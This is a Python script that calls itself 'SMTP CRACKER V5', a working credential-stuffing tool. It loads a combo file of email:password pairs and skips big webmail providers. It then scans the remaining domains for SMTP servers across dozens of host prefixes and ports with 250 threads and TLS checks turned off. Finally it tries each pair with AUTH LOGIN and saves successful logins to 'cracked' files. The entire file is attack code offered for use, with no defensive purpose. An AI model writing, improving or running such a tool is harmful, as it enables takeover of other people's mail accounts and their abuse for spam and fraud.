import os, sys, socket, threading, base64, ssl, time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class _N:
        def __getattr__(self, n): return ""
    Fore = Style = _N()

# ── CONFIG ──
SKIP_DOMAINS = {
    "gmail.com","googlemail.com","outlook.com","hotmail.com","live.com",
    "msn.com","hotmail.co.uk","hotmail.fr","hotmail.de","live.fr","live.de",
    "outlook.fr","outlook.de","outlook.co.uk","live.co.uk",
    "msn.fr","msn.de","msn.co.uk",
    "yahoo.com","ymail.com","rocketmail.com",
    "yahoo.co.uk","yahoo.fr","yahoo.de","yahoo.es","yahoo.it",
    "aol.com","aim.com","aol.co.uk",
}

HOST_PREFIXES = [
    "", "smtp.", "mail.", "webmail.", "secure.",
			"smtp.mail.", "outgoing.", "smtp-mail.", "mx.", "mx1.",
			"relay.", "mailgate.", "smtp-gateway.", "exchange.",
			"outbound.", "inbound.", "smtp-relay.", "smtp-secure.",
			"authsmtp.", "plussmtp.", "smtpmail.", "pop3.", "securesmtp.",
			"smtp2.", "smtp3.", "smtp4.", "smtp5.",
			"smtp-alt.", "smtp-alt1.", "smtp-alt2.", "smtp-alt3.", "smtp-alt4.", "smtp-alt5.",
			"smtp-relay1.", "smtp-relay2.", "smtp-relay3.", "smtp-relay4.", "smtp-relay5.",
			"smtp-relay6.", "smtp-relay7.", "smtp-relay8.", "smtp-relay9.", "smtp-relay10.",
			"smtp-auth.", "smtp-auth1.", "smtp-auth2.", "smtp-auth3.", "smtp-auth4.", "smtp-auth5.",
			"smtp-direct.", "smtp-direct1.", "smtp-direct2.", "smtp-direct3.", "smtp-direct4.", "smtp-direct5.",
			"smtp-direct6.", "smtp-direct7.", "smtp-direct8.", "smtp-direct9.", "smtp-direct10.",
			"smtp-secure1.", "smtp-secure2.", "smtp-secure3.", "smtp-secure4.", "smtp-secure5.",
			"smtp-secure6.", "smtp-secure7.", "smtp-secure8.", "smtp-secure9.", "smtp-secure10.",
			"smtp-test.", "smtp-test1.", "smtp-test2.", "smtp-test3.", "smtp-test4.", "smtp-test5.",
			"smtp-dev.", "smtp-dev1.", "smtp-dev2.", "smtp-dev3.", "smtp-dev4.", "smtp-dev5.",
			"smtp-staging.", "smtp-staging1.", "smtp-staging2.", "smtp-staging3.", "smtp-staging4.", "smtp-staging5.",
			"smtp-production.", "smtp-production1.", "smtp-production2.", "smtp-production3.", "smtp-production4.", "smtp-production5.",
			"smtp-bkp.", "smtp-bkp1.", "smtp-bkp2.", "smtp-bkp3.", "smtp-bkp4.", "smtp-bkp5.",
			"smtp-tls.", "smtp-tls1.", "smtp-tls2.", "smtp-tls3.", "smtp-tls4.", "smtp-tls5.",
			"smtp-ssl.", "smtp-ssl1.", "smtp-ssl2.", "smtp-ssl3.", "smtp-ssl4.", "smtp-ssl5.",
			"smtp-internal.", "smtp-internal1.", "smtp-internal2.", "smtp-internal3.", "smtp-internal4.", "smtp-internal5.",
			"smtp-external.", "smtp-external1.", "smtp-external2.", "smtp-external3.", "smtp-external4.", "smtp-external5.",
			"smtp-trial.", "smtp-trial1.", "smtp-trial2.", "smtp-trial3.", "smtp-trial4.", "smtp-trial5.",
			"smtp-free.", "smtp-free1.", "smtp-free2.", "smtp-free3.", "smtp-free4.", "smtp-free5.",
			"smtp-custom.", "smtp-custom1.", "smtp-custom2.", "smtp-custom3.", "smtp-custom4.", "smtp-custom5.",
			"smtp-prod.", "smtp-prod1.", "smtp-prod2.", "smtp-prod3.", "smtp-prod4.", "smtp-prod5.",
			"smtp-poc.", "smtp-poc1.", "smtp-poc2.", "smtp-poc3.", "smtp-poc4.", "smtp-poc5.",
			"smtp-uat.", "smtp-uat1.", "smtp-uat2.", "smtp-uat3.", "smtp-uat4.", "smtp-uat5.",
			"smtp-demo.", "smtp-demo1.", "smtp-demo2.", "smtp-demo3.", "smtp-demo4.", "smtp-demo5.",
			"smtp-int.", "smtp-int1.", "smtp-int2.", "smtp-int3.", "smtp-int4.", "smtp-int5.",
]

FAST_PORTS  = [25, 465, 587, 1025, 2525]
ALL_PORTS   = [
    25,465,587,1025,2525,110,995,993,443,500,502,26,588,589,
    2525,2553,2560,2565,2570,2580,2595,2600,2650,2665,2670,2680,
    2695,2700,2750,2765,2770,2780,2795,2800,2850,2865,2870,2880,
    2895,2900,2950,2965,2970,2980,2995,3000,3050,3065,3070,3080,
    3095,3100,3150,3165,3170,3180,3195,3200,3250,3265,3270,3280,
    3295,3300,3350,3365,3370,3380,3395,3400,3450,3465,3470,3480,
    3495,3500,3550,3565,3570,3580,3595,3600,3650,3665,3670,3680,
    3695,3700,3750,3765,3770,3780,3795,3800,3850,3865,3870,3880,
    3895,3900,3950,3965,3970,3980,3995,4000,3306,
]

TIMEOUT      = 1
THREAD_COUNT = 250
READ_SIZE    = 4096

file_lock    = threading.Lock()
print_lock   = threading.Lock()
dns_cache    = {}
dns_lock     = threading.Lock()
_ssl_ctx     = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode    = ssl.CERT_NONE


# ── HELPERS ──
def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def safe_write(fn, data):
    with file_lock:
        with open(fn, 'a', encoding='utf-8') as f:
            f.write(data + '\n')

def resolve(domain):
    with dns_lock:
        if domain in dns_cache:
            return dns_cache[domain]
    try:
        ip = socket.getaddrinfo(domain, None, socket.AF_INET)[0][4][0]
    except Exception:
        ip = None
    with dns_lock:
        dns_cache[domain] = ip
    return ip


# ═══════════════════════════════════════════════
#  PHASE 1: PARALLEL DOMAIN SCAN
# ═══════════════════════════════════════════════
def probe(domain, prefix, port):
    ip = resolve(domain)
    if not ip:
        return None
    host = prefix + domain
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        if port == 465:
            sock = _ssl_ctx.wrap_socket(sock, server_hostname=host)
            data = sock.recv(READ_SIZE)
        else:
            data = sock.recv(READ_SIZE)
        if data.decode(errors='ignore').strip().startswith('220'):
            return (host, port)
    except Exception:
        pass
    finally:
        if sock:
            try: sock.close()
            except: pass
    return None


def scan_domain(domain):
    """
    Scan ONE domain fully.
    Phase 1a: 5 fast ports × all prefixes
    Phase 1b: rest ports × top-3 prefixes
    Returns (host, port) or None.
    """
    # 1a
    for port in FAST_PORTS:
        for pfx in HOST_PREFIXES:
            r = probe(domain, pfx, port)
            if r:
                return r
    # 1b
    rest = [p for p in ALL_PORTS if p not in FAST_PORTS]
    for port in rest:
        for pfx in HOST_PREFIXES[:3]:
            r = probe(domain, pfx, port)
            if r:
                return r
    return None


# ═══════════════════════════════════════════════
#  PHASE 2: PARALLEL LOGIN
# ═══════════════════════════════════════════════
def smtp_login(host, port, email, password):
    sock = None
    try:
        ip = resolve(host) or host
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        if port == 465:
            sock = _ssl_ctx.wrap_socket(sock, server_hostname=host)
            sock.recv(READ_SIZE)
        else:
            sock.recv(READ_SIZE)
            if port in (587, 25, 1025, 2525):
                sock.send(b"EHLO localhost\r\n")
                ehlo = sock.recv(READ_SIZE).decode(errors='ignore')
                if 'STARTTLS' in ehlo:
                    sock.send(b"STARTTLS\r\n")
                    if sock.recv(READ_SIZE).decode(errors='ignore').startswith('220'):
                        sock = _ssl_ctx.wrap_socket(sock, server_hostname=host)
                        sock.send(b"EHLO localhost\r\n")
                        sock.recv(READ_SIZE)
        sock.send(b"EHLO localhost\r\n")
        sock.recv(READ_SIZE)
        sock.send(b"AUTH LOGIN\r\n")
        r = sock.recv(READ_SIZE).decode(errors='ignore').strip()
        if not r.startswith('334'):
            return False
        sock.send(base64.b64encode(email.encode()) + b"\r\n")
        r = sock.recv(READ_SIZE).decode(errors='ignore').strip()
        if not r.startswith('334'):
            return False
        sock.send(base64.b64encode(password.encode()) + b"\r\n")
        return sock.recv(READ_SIZE).decode(errors='ignore').strip().startswith('235')
    except Exception:
        return False
    finally:
        if sock:
            try: sock.close()
            except: pass


def try_login(email, pwd, host, port):
    if smtp_login(host, port, email, pwd):
        cracked.add(email)
        safe_write('cracked_smtps.txt',      f"{host}:{port}|{email}:{pwd}")
        safe_write('cracked_Mailaccess.txt', f"{email}:{pwd}")
        safe_print(Fore.GREEN + Style.BRIGHT +
                   f"  ★ {email}:{pwd}  @ {host}:{port}" + Fore.RESET)
        return 1
    return 0


cracked = set()


# ═══════════════════════════════════════════════
#  MAIN – TWO PHASES
# ═══════════════════════════════════════════════
def main():
    global total_count

    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + f"""
   SMTP CRACKER V5 – TWO-PHASE (250 THREADS)
   Phase 1: Scan all domains in parallel
   Phase 2: Login all emails in parallel
""" + Fore.RESET)
    print(Fore.YELLOW + "=" * 55 + Fore.RESET)

    path = input(Fore.YELLOW + "[+] Combo file: " + Fore.RESET).strip()
    try:
        lines = Path(path).read_text('utf-8', errors='ignore').splitlines()
    except Exception as e:
        print(Fore.RED + f"[!] {e}")
        input("Press Enter to exit...")
        return

    combos, seen = [], set()
    for ln in lines:
        ln = ln.strip()
        if ':' not in ln: continue
        e, p = ln.split(':', 1)
        e, p = e.strip().lower(), p.strip()
        if '@' not in e or not p: continue
        if e.split('@')[1] in SKIP_DOMAINS: continue
        k = f"{e}:{p}"
        if k in seen: continue
        seen.add(k)
        combos.append((e.split('@')[1], e, p))

    total_count = len(combos)
    if not total_count:
        print(Fore.RED + "[!] No valid combos.")
        input("Press Enter to exit...")
        return

    unique_domains = list({c[0] for c in combos})

    print(Fore.GREEN + f"[+] {total_count} combos, {len(unique_domains)} unique domains")
    print(Fore.CYAN   + f"[+] {THREAD_COUNT} threads\n")

    # ── PHASE 1: scan all domains in parallel ──
    print(Fore.YELLOW + f"[PHASE 1] Scanning {len(unique_domains)} domains...")
    t0 = time.time()
    smtp_map = {}  # domain → (host, port)

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as pool:
        futs = {pool.submit(scan_domain, d): d for d in unique_domains}
        done = 0
        for fut in as_completed(futs):
            done += 1
            d = futs[fut]
            try:
                r = fut.result()
                if r:
                    smtp_map[d] = r
                    safe_print(f"  {Fore.CYAN}[{done}/{len(unique_domains)}]"
                               f" FOUND {d} → {r[0]}:{r[1]}{Fore.RESET}")
            except Exception:
                pass

    scan_time = int(time.time() - t0)
    found = len(smtp_map)
    print(Fore.GREEN + f"[PHASE 1 DONE] {found}/{len(unique_domains)} domains in {scan_time}s\n")

    # ── PHASE 2: login all emails in parallel ──
    login_tasks = [
        (e, p, smtp_map[d][0], smtp_map[d][1])
        for d, e, p in combos
        if d in smtp_map and e not in cracked
    ]

    print(Fore.YELLOW + f"[PHASE 2] Logging in {len(login_tasks)} emails...")
    t1 = time.time()

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as pool:
        futs = [pool.submit(try_login, e, p, h, pt) for e, p, h, pt in login_tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    login_time = int(time.time() - t1)
    total_time = int(time.time() - t0)

    print(Fore.CYAN + "\n" + "=" * 55)
    print(Fore.GREEN + f"  Scan time  : {scan_time}s")
    print(Fore.GREEN + f"  Login time : {login_time}s")
    print(Fore.GREEN + f"  Total      : {total_time}s")
    print(Fore.GREEN + f"  Cracked    : {len(cracked)}")
    print(Fore.GREEN + f"  → cracked_smtps.txt / cracked_Mailaccess.txt")
    print(Fore.CYAN + "=" * 55)
    input("\nPress Enter to exit...")


if __name__ == '__main__':
    main()
